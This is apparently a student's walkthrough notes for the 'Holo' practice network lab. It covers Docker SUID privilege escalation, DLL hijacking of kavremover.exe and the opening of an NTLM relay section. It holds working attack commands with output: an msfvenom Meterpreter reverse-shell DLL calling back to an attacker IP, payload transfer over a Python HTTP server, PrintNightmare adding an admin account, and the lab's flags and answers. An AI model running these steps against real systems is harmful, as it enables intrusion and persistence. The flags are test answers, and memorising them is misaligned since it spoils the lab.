+ /sssssssshNMMMyhhyyyyhmNMMMNhssssssss/    Packages: 709 (dpkg) 
+.ssssssssdMMMNhsssssssssshNMMMdssssssss.   Shell: bash 5.0.17 
++sssshhhyNMMNyssssssssssssyNMMMysssssss+   CPU: Intel Xeon E5-2676 v3 (2) @ 2.399GHz 
+ossyNMMMNyMMhsssssssssssssshmmmhssssssso   GPU: 00:02.0 Cirrus Logic GD 5446 
+ossyNMMMNyMMhsssssssssssssshmmmhssssssso   Memory: 743MiB / 3933MiB 
++sssshhhyNMMNyssssssssssssyNMMMysssssss+
+.ssssssssdMMMNhsssssssssshNMMMdssssssss.                           
+ /sssssssshNMMMyhhyyyyhdNMMMNhssssssss/                            
+  +sssssssssdmydMMMMMMMMddddyssssssss+
+   /ssssssssssshdmNNNNmyNMMMMhssssss/
+    .ossssssssssssssssssdMMMNysssso.
+      -+sssssssssssssssssyyyssss+-
+        `:+ssssssssssssssssss+:`
+            .-/+oossssoo+/-.
+
+root@85e950a1a8ca:/# ls                          ls
+ls
+bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
+boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
+
+root@85e950a1a8ca:/# cd root              cd root
+cd root
+root@85e950a1a8ca:~# ls                   ls
+ls
+root.txt  snap
+root@85e950a1a8ca:~# cat root.txt         cat root.txt
+cat root.txt
+HOLO{e16581b01d445a05adb2e6d45eb373f7}
+```
+What is the full path of the binary with an SUID bit set on L-SRV01?
+find / -perm -u=s -type f 2>/dev/null
+*/usr/bin/docker*
+What is the full first line of the exploit for the SUID bit?
+gtfobins
+*sudo install -m =xs $(which docker) .*
+Escalate privileges and submit root flag to Task 4.
+*HOLO{e16581b01d445a05adb2e6d45eb373f7}*
+![[Pasted image 20230131215953.png]]
+```text
+PS C:\Windows\Tasks> Get-ScheduledTask
+
+TaskPath                                       TaskName                          State
+--------                                       --------                          -----
+\Microsoft\Windows\                            Server Initial Configuration Task Disabled
+\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319    Ready
+\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319 64 Ready
+\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319... Disabled
+\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319... Disabled
+\Microsoft\Windows\Active Directory Rights ... AD RMS Rights Policy Template ... Disabled
+\Microsoft\Windows\Active Directory Rights ... AD RMS Rights Policy Template ... Ready
+\Microsoft\Windows\AppID\                      PolicyConverter                   Ready
+\Microsoft\Windows\AppID\                      VerifiedPublisherCertStoreCheck   Ready
+\Microsoft\Windows\Application Experience\     Microsoft Compatibility Appraiser Ready
+\Microsoft\Windows\Application Experience\     ProgramDataUpdater                Ready
+\Microsoft\Windows\Application Experience\     StartupAppTask                    Ready
+\Microsoft\Windows\ApplicationData\            appuriverifierdaily               Ready
+\Microsoft\Windows\ApplicationData\            appuriverifierinstall             Ready
+\Microsoft\Windows\ApplicationData\            CleanupTemporaryState             Ready
+\Microsoft\Windows\ApplicationData\            DsSvcCleanup                      Ready
+\Microsoft\Windows\AppxDeploymentClient\       Pre-staged app cleanup            Disabled
+\Microsoft\Windows\Autochk\                    Proxy                             Ready
+\Microsoft\Windows\BitLocker\                  BitLocker Encrypt All Drives      Ready
+\Microsoft\Windows\BitLocker\                  BitLocker MDM policy Refresh      Ready
+\Microsoft\Windows\Bluetooth\                  UninstallDeviceTask               Disabled
+\Microsoft\Windows\BrokerInfrastructure\       BgTaskRegistrationMaintenanceTask Ready
+\Microsoft\Windows\CertificateServicesClient\  UserTask                          Ready
+\Microsoft\Windows\CertificateServicesClient\  UserTask-Roam                     Ready
+\Microsoft\Windows\Chkdsk\                     ProactiveScan                     Ready
+\Microsoft\Windows\Chkdsk\                     SyspartRepair                     Ready
+\Microsoft\Windows\CloudExperienceHost\        CreateObjectTask                  Ready
+\Microsoft\Windows\Customer Experience Impr... Consolidator                      Ready
+\Microsoft\Windows\Customer Experience Impr... UsbCeip                           Ready
+\Microsoft\Windows\Data Integrity Scan\        Data Integrity Scan               Ready
+\Microsoft\Windows\Data Integrity Scan\        Data Integrity Scan for Crash ... Ready
+\Microsoft\Windows\Defrag\                     ScheduledDefrag                   Ready
+\Microsoft\Windows\Device Information\         Device                            Ready
+\Microsoft\Windows\Diagnosis\                  Scheduled                         Ready
+\Microsoft\Windows\DirectX\                    DXGIAdapterCache                  Ready
+\Microsoft\Windows\DiskCleanup\                SilentCleanup                     Ready
+\Microsoft\Windows\DiskDiagnostic\             Microsoft-Windows-DiskDiagnost... Disabled
+\Microsoft\Windows\DiskDiagnostic\             Microsoft-Windows-DiskDiagnost... Disabled
+\Microsoft\Windows\DiskFootprint\              Diagnostics                       Ready
+\Microsoft\Windows\DiskFootprint\              StorageSense                      Ready
+\Microsoft\Windows\EDP\                        EDP App Launch Task               Ready
+\Microsoft\Windows\EDP\                        EDP Auth Task                     Ready
+\Microsoft\Windows\EDP\                        EDP Inaccessible Credentials Task Ready
+\Microsoft\Windows\EDP\                        StorageCardEncryption Task        Ready
+\Microsoft\Windows\ExploitGuard\               ExploitGuard MDM policy Refresh   Ready
+\Microsoft\Windows\File Classification Infr... Property Definition Sync          Disabled
+\Microsoft\Windows\Flighting\FeatureConfig\    ReconcileFeatures                 Ready
+\Microsoft\Windows\Flighting\OneSettings\      RefreshCache                      Ready
+\Microsoft\Windows\InstallService\             ScanForUpdates                    Disabled
+\Microsoft\Windows\InstallService\             ScanForUpdatesAsUser              Disabled
+\Microsoft\Windows\InstallService\             WakeUpAndContinueUpdates          Disabled
+\Microsoft\Windows\InstallService\             WakeUpAndScanForUpdates           Disabled
+\Microsoft\Windows\LanguageComponentsInstal... Installation                      Ready
+\Microsoft\Windows\Location\                   Notifications                     Ready
+\Microsoft\Windows\Location\                   WindowsActionDialog               Ready
+\Microsoft\Windows\Maintenance\                WinSAT                            Ready
+\Microsoft\Windows\Maps\                       MapsToastTask                     Disabled
+\Microsoft\Windows\Maps\                       MapsUpdateTask                    Disabled
+\Microsoft\Windows\MemoryDiagnostic\           ProcessMemoryDiagnosticEvents     Disabled
+\Microsoft\Windows\MemoryDiagnostic\           RunFullMemoryDiagnostic           Disabled
+\Microsoft\Windows\Mobile Broadband Accounts\  MNO Metadata Parser               Ready
+\Microsoft\Windows\MUI\                        LPRemove                          Ready
+\Microsoft\Windows\Multimedia\                 SystemSoundsService               Disabled
+\Microsoft\Windows\NetTrace\                   GatherNetworkInfo                 Ready
+\Microsoft\Windows\Offline Files\              Background Synchronization        Disabled
+\Microsoft\Windows\Offline Files\              Logon Synchronization             Disabled
+\Microsoft\Windows\PLA\                        Server Manager Performance Mon... Disabled
+\Microsoft\Windows\Plug and Play\              Device Install Group Policy       Ready
+\Microsoft\Windows\Plug and Play\              Device Install Reboot Required    Ready
+\Microsoft\Windows\Plug and Play\              Sysprep Generalize Drivers        Ready
+\Microsoft\Windows\Power Efficiency Diagnos... AnalyzeSystem                     Ready
+\Microsoft\Windows\RecoveryEnvironment\        VerifyWinRE                       Disabled
+\Microsoft\Windows\Registry\                   RegIdleBackup                     Ready
+\Microsoft\Windows\Server Manager\             CleanupOldPerfLogs                Ready
+\Microsoft\Windows\Server Manager\             ServerManager                     Ready
+\Microsoft\Windows\Servicing\                  StartComponentCleanup             Ready
+\Microsoft\Windows\SharedPC\                   Account Cleanup                   Disabled
+\Microsoft\Windows\Shell\                      CreateObjectTask                  Ready
+\Microsoft\Windows\Shell\                      IndexerAutomaticMaintenance       Ready
+\Microsoft\Windows\Software Inventory Logging\ Collection                        Disabled
+\Microsoft\Windows\Software Inventory Logging\ Configuration                     Ready
+\Microsoft\Windows\SoftwareProtectionPlatform\ SvcRestartTaskLogon               Ready
+\Microsoft\Windows\SpacePort\                  SpaceAgentTask                    Ready
+\Microsoft\Windows\SpacePort\                  SpaceManagerTask                  Ready
+\Microsoft\Windows\Speech\                     HeadsetButtonPress                Ready
+\Microsoft\Windows\Storage Tiers Management\   Storage Tiers Management Initi... Ready
+\Microsoft\Windows\Storage Tiers Management\   Storage Tiers Optimization        Disabled
+\Microsoft\Windows\Task Manager\               Interactive                       Ready
+\Microsoft\Windows\termsrv\RemoteFX\           RemoteFXvGPUDisableTask           Ready
+\Microsoft\Windows\termsrv\RemoteFX\           RemoteFXWarningTask               Ready
+\Microsoft\Windows\TextServicesFramework\      MsCtfMonitor                      Ready
+\Microsoft\Windows\Time Synchronization\       ForceSynchronizeTime              Ready
+\Microsoft\Windows\Time Synchronization\       SynchronizeTime                   Ready
+\Microsoft\Windows\Time Zone\                  SynchronizeTimeZone               Ready
+\Microsoft\Windows\UPnP\                       UPnPHostConfig                    Disabled
+\Microsoft\Windows\WDI\                        ResolutionHost                    Running
+\Microsoft\Windows\Windows Defender\           Windows Defender Cache Mainten... Ready
+\Microsoft\Windows\Windows Defender\           Windows Defender Cleanup          Ready
+\Microsoft\Windows\Windows Defender\           Windows Defender Scheduled Scan   Ready
+\Microsoft\Windows\Windows Defender\           Windows Defender Verification     Ready
+\Microsoft\Windows\Windows Error Reporting\    QueueReporting                    Ready
+\Microsoft\Windows\Windows Filtering Platform\ BfeOnServiceStartTypeChange       Ready
+\Microsoft\Windows\Windows Media Sharing\      UpdateLibrary                     Ready
+\Microsoft\Windows\WindowsColorSystem\         Calibration Loader                Ready
+\Microsoft\Windows\WindowsUpdate\              Scheduled Start                   Ready
+\Microsoft\Windows\Wininet\                    CacheTask                         Running
+\Microsoft\Windows\Workplace Join\             Automatic-Device-Join             Ready
+\Microsoft\Windows\Workplace Join\             Recovery-Check                    Disabled
+
+PS C:\Windows\Tasks> Get-ScheduledTask -TaskPath "\Users\*"
+PS C:\Windows\Tasks> Get-ScheduledTask -TaskPath "\Microsoft\VisualStudio\*"
+
+PS C:\Windows\Tasks> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+PS C:\Windows\Tasks> Import-Module ActiveDirectory; Get-ADGroup
+Import-Module : The specified module 'ActiveDirectory' was not loaded because no valid module file was found in any
+module directory.
+At line:1 char:1
++ Import-Module ActiveDirectory; Get-ADGroup
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (ActiveDirectory:String) [Import-Module], FileNotFoundException
+    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand
+
+Get-ADGroup : The term 'Get-ADGroup' is not recognized as the name of a cmdlet, function, script file, or operable
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:32
++ Import-Module ActiveDirectory; Get-ADGroup
++                                ~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Get-ADGroup:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Windows\Tasks> Import-Module ActiveDirectory; Get-ADGroupMember
+Import-Module : The specified module 'ActiveDirectory' was not loaded because no valid module file was found in any
+module directory.
+At line:1 char:1
++ Import-Module ActiveDirectory; Get-ADGroupMember
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (ActiveDirectory:String) [Import-Module], FileNotFoundException
+    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand
+
+Get-ADGroupMember : The term 'Get-ADGroupMember' is not recognized as the name of a cmdlet, function, script file, or
+operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
+again.
+At line:1 char:32
++ Import-Module ActiveDirectory; Get-ADGroupMember
++                                ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Get-ADGroupMember:String) [], CommandNotFoundException
+
+uhmm
+```
+Now that we have performed all the enumeration and situational awareness, we can move on to privilege escalation. Looking through our enumeration steps, you may notice a unique application connected to a scheduled task on the endpoint. We can attempt a DLL hijack on this application to escalate privileges, then set up persistence on the endpoint.
+From the MITRE ATT&CK framework, DLL Hijacking is defined as "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. [[1]](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution." The AT&CK Technique ID is [T1574](https://attack.mitre.org/techniques/T1574/).
+To utilize DLL Hijacking for privilege escalation, we will need to research the application and known vulnerabilities and DLLs and find a DLL not present on the system we have write access to.
+DLL Hijacking can also be used for persistence, as we will see later in the next task. This process is much easier than the previous one as we can use process monitoring tools like ProcMon and ProcessHacker2 to monitor for DLLs and their locations that can take over. The DLL persistence works by running the DLL with the application every time the system restarts or our connection is interrupted. This can be an application we put onto the system or an application already present that we exploit.
+Steps taken to perform DLL hijacking are outlined below.
+1.  Identify vulnerable application and location
+2.  Identify applications PID
+3.  Identify vulnerable DLLs that can be hijacked
+4.  Use MSFVenom or other payload creation tools to create a malicious DLL
+5.  Replace the original DLL with the malicious DLL
+6.  Profit
+To begin escalating privileges with DLL Hijacking, we need to identify an application and scheduled task that we can target; this is covered in the previous two tasks. Once we have identified our target, we can use the power of Google to search for potential vulnerable DLLs associated with the application as we can not use tools like ProcMon to make the process easier.
+By googling, `DLL Hijacking`, we can see several articles and blog posts that can lead us in the right direction and research the application for us.
+If there is not any research on the application available, say a proprietary application. You can attempt to download the application from the server or find an identical copy on the internet for download that will allow you to search for vulnerable DLLs on your local machine. If you decide to take this approach, skip to the next task and complete the steps with ProcMon before returning to this task and exploiting the vulnerable DLL.
+---
+Once you have identified a DLL to target, you can decide to create a malicious DLL in Metasploit or Covenant or even create one from scratch. Depending on the endpoint you land on, and detection/anti-virus measures in place will determine how you approach creating a malicious DLL.
+The first method we will be looking at is using MSFVenom to generate a Metasploit DLL. Find the command used below.
+Command used: `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=53 -f dll -o not_malicious.dll`
+The second method we will be looking at will use the Covenant InstallUtil launcher to generate a DLL that we can download. To generate the DLL navigate to _Launchers > InstallUtil > Download_.
+![](https://i.imgur.com/xqDQhKG.png)
+For both of the methods used, you will now need to rename the malicious DLL then transfer it to the target machine in the correct path. You can do this by using the python HTTP server, Updog, or the Covenant Host function.
+Finally, execute the vulnerable application or wait for the scheduled task to trigger and watch your listener for incoming connections.
+Answer the questions below
+```text
+PS C:\Users\watamet> ls
+
+    Directory: C:\Users\watamet
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       12/12/2020   1:34 AM                3D Objects
+d-----        9/20/2021   4:28 PM                Applications
+d-r---       12/12/2020   1:34 AM                Contacts
+d-r---         2/7/2023   1:58 AM                Desktop
+d-r---       12/12/2020   1:34 AM                Documents
+d-r---         4/7/2021   2:22 AM                Downloads
+d-r---       12/12/2020   1:34 AM                Favorites
+d-r---       12/12/2020   1:34 AM                Links
+d-r---       12/12/2020   1:34 AM                Music
+d-r---       12/12/2020   1:34 AM                Pictures
+d-r---       12/12/2020   1:34 AM                Saved Games
+d-r---       12/12/2020   1:34 AM                Searches
+d-r---       12/12/2020   1:34 AM                Videos
+PS C:\Users\Administrator> cd C:\Users\watamet\Applications
+PS C:\Users\watamet\Applications> ls
+
+    Directory: C:\Users\watamet\Applications
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       12/10/2020  11:34 PM        4870584 kavremover.exe
+```
+Read the above and exploit the application.
+Completed
+What is the name of the vulnerable application found on PC-FILESRV01?
+*kavremover*
+Submit the root flag from PC-FILESRV01 in Task 4.
+Completed
+### Persistence WERE TAKING OVER THIS DLL! Part: II
+Now that we have administrator privileges or moved the application onto our local development machine, we can search for other vulnerable DLL locations using ProcMon or Processhacker2. We can identify vulnerable DLLs by finding the process and PID of the application we are targeting then use filters or modules to search for the DLLs that meet specific requirements to be vulnerable. To be vulnerable, a DLL must meet the below requirements.
+-   Defined by the target application
+-   Ends with .DLL
+-   Must be run by the target application
+-   DLL does not exist on the system
+-   Write privileges for DLL location
+In this task, we will be focusing on identifying DLLs with ProcMon, part of the Sysinternals suite [https://docs.microsoft.com/en-us/sysinternals/downloads/procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon).
+To begin, we will need to open ProcMon as an Administrator. ProcMon will start with an extensive list of all DLLs and processes from all PIDs running on the system. To aid us, we can apply filters to this output to identify information.
+![](https://i.imgur.com/PRRDZI6.png)
+To open the filters, navigate to _filter > Filter._
+You will want to filter based on the process name so change the filter to be: `Process Name, Contains, Name of Vulnerable Application`, then navigate to add and add the filter to ProcMon.
+![](https://i.imgur.com/i0hl1x5.png)
+If you look at the process list, there will only be processes from the vulnerable application.
+![](https://i.imgur.com/t6UJrCQ.png)
+Now that we have refined the search down to the application, we can filter it again to only show .DLL files.
+You will filter on the pathname so change the filter to be: `Path, ends with, .dll`, then navigate to add and add the filter to ProcMon.
+![](https://i.imgur.com/y2XjIxD.png)
+Now that we have refined our search again, we can look through the output of DLLs run by the vulnerable application.
+![](https://i.imgur.com/l4Xie7q.png)
+When looking for a DLL to target, we want to look for a DLL in a path that we can write. We also want to ensure the DLL does not exist on the system in its current state; this will show up as `NAME NOT FOUND`. This means the application attempts to load it but cannot because it does not exist on the system. We can then hijack and use it to run our malicious code.
+Since we're looking for files with paths that we can access, we may want to filter again to something like Desktop, Downloads, Documents. This will allow us to refine our search further for DLLs that we can write. The preferred way to filter again would be to filter the result based on `NAME NOT FOUND`.
+You will filter on the result so change the filter to be: Result, contains, `NAME NOT FOUND`, then navigate to add and add the filter to ProcMon.
+![](https://i.imgur.com/32vFfu8.png)
+If we look at the list of processes in ProcMon, we will see a list of DLLs that can be exploited.
+![](https://i.imgur.com/8xu1QAf.png)
+We can now control the DLLs using our previously created malicious DLLs and set up quiet persistence on the device by working off applications and processes already running.
+Answer the questions below
+```text
+https://medium.com/techzap/dll-hijacking-part-1-basics-b6dfb8260cf1
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.74.15 LPORT=4444 -f dll -o kavremoverENU.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of dll file: 8704 bytes
+Saved as: kavremoverENU.dll
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+PS C:\Users\watamet\Applications> Invoke-WebRequest http://10.50.74.15:8000/kavremoverENU.dll -outfile C:\Users\watamet\Applications\kavremoverENU.dll
+
+PS C:\Users\watamet\Applications> ls
+
+    Directory: C:\Users\watamet\Applications
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       12/10/2020  11:34 PM        4870584 kavremover.exe
+-a----         2/7/2023   4:06 AM           8704 kavremoverENU.dll
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.200.95.35 - - [06/Feb/2023 23:06:27] "GET /kavremoverENU.dll HTTP/1.1" 200 -
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ msfconsole                                                                                          
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+       =[ metasploit v6.2.33-dev                          ]
++ -- --=[ 2275 exploits - 1192 auxiliary - 406 post       ]
++ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Display the Framework log using the 
+log command, learn more with help log
+Metasploit Documentation: https://docs.metasploit.com/
+```
+```text
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+```
+```text
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(multi/handler) > set lhost 10.50.74.15
+lhost => 10.50.74.15
+```
+```text
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.50.74.15:4444 
+
+uhmm not work another way
+
+/home/kali/Set/CVE-2021-1675.ps1
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ cp /home/kali/Set/CVE-2021-1675.ps1 CVE-2021-1675.ps1
+
+PS C:\Users\watamet\Desktop> Invoke-WebRequest http://10.50.74.15:8000/CVE-2021-1675.ps1 -outfile C:\Users\watamet\Applications\CVE-2021-1675.ps1
+PS C:\Users\watamet\Desktop> cd C:\Users\watamet\Applications\
+PS C:\Users\watamet\Applications> ls
+
+    Directory: C:\Users\watamet\Applications
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         2/7/2023   4:36 AM         178561 CVE-2021-1675.ps1
+-a----       12/10/2020  11:34 PM        4870584 kavremover.exe
+-a----         2/7/2023   4:06 AM           8704 kavremoverENU.dll
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+10.200.95.35 - - [06/Feb/2023 23:36:27] "GET /CVE-2021-1675.ps1 HTTP/1.1" 200 -
+
+PS C:\Users\watamet\Applications> Import-Module .\CVE-2021-1675.ps1
+>>
+PS C:\Users\watamet\Applications> Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\watamet\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\watamet\AppData\Local\Temp\nightmare.dll
+
+or Invoke-Nightmare -NewUser lala -NewPassword "anything"
+
+PS C:\Users\watamet\Applications> net user
+
+User accounts for \\PC-FILESRV01
+
+-------------------------------------------------------------------------------
+adm1n                    Administrator            DefaultAccount
+Guest                    WDAGUtilityAccount
+The command completed successfully.
+
+PS C:\Users\watamet\Applications> net user adm1n
+User name                    adm1n
+Full Name                    adm1n
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/7/2023 4:39:07 AM
+Password expires             Never
+Password changeable          2/8/2023 4:39:07 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *None
+The command completed successfully.
+
+Now login with adm1n:P@ssw0rd
+```
+```text
+┌──(kali㉿kali)-[~/Holo/GibsonBird/chapter4]
+└─$ rdesktop -u 'adm1n' -p 'P@ssw0rd' 10.200.95.35 
+
+after login I go to C:\Users\watamet\Applicationsand execute kavremover.exe
+and works 😂 
+
+maybe admin was sleeping
+```
+```text
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.50.74.15:4444 
+[*] Sending stage (175686 bytes) to 10.200.95.35
+[*] Meterpreter session 1 opened (10.50.74.15:4444 -> 10.200.95.35:50054) at 2023-02-06 23:47:02 -0500
+```
+```text
+meterpreter > ifconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+Interface  6
+============
+Name         : AWS PV Network Device #0
+Hardware MAC : 02:ad:45:3c:89:43
+MTU          : 9001
+IPv4 Address : 10.200.95.35
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::b0db:4d99:84af:ac44
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+```
+```text
+meterpreter > cat 'C:\Users\Administrator\Desktop\root.txt'
+HOLO{ee7e68a69829e56e1d5b4a73e7ffa5f0}
+
+C:\Users\adm1n>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\adm1n> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name          SID
+================== ==============================================
+pc-filesrv01\adm1n S-1-5-21-4241685735-4112329853-1893400299-1008
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes                  
+============================================================= ================ ============ ===============================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                             
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+![[Pasted image 20230206234719.png]]
+Read the above and set up persistence on PC-FILESRV01.
+Completed
+What is the first listed vulnerable DLL located in the Windows folder from the application
+*wow64log.dll*
+### NTLM Relay Never trust the LanMan
+You now have administrator access to PC-FILESRV01; you know that you are in a domain content. Your research team has developed a brand new never-seen exploit to relay requests and dump domain credentials. We will cover this new exploit in the following four tasks and weaponize it to gain domain administrator access and own the domain with a relay.
+To begin this attack, we will identify what NTLM is and how it is integrated into Windows.
+Net-NTLMv1 is a challenge/response protocol that uses NTHash. This version will use both NT and LM hashes. You can find the algorithm used to hash below.
+`C = 8-byte server challenge, random K1 | K2 | K3 = LM/NT-hash | 5-bytes-0 response = DES(K1,C) | DES(K2,C) | DES(K3,C)`
+Net-NTLMv2 is an updated version of Net-NTLMv1. This hash protocol will use the same processes as v1 but will use a different algorithm and response. This version is the default since Windows 2000.
